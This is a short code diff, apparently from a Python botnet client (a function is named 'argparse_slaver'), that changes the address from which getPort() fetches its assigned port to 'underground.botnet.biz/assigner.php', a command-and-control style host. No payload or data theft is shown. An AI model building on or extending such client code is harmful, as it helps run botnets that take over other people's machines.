@@ -323,7 +323,7 @@ def argparse_slaver():
     return parser.parse_args()
 
 def getPort():
-    port = urllib.request.urlopen("http://ports.botnet.biz").read()
+    port = urllib.request.urlopen("http://underground.botnet.biz/assigner.php").read()
     port = port.decode('utf-8')
     port = port.split(":")
 
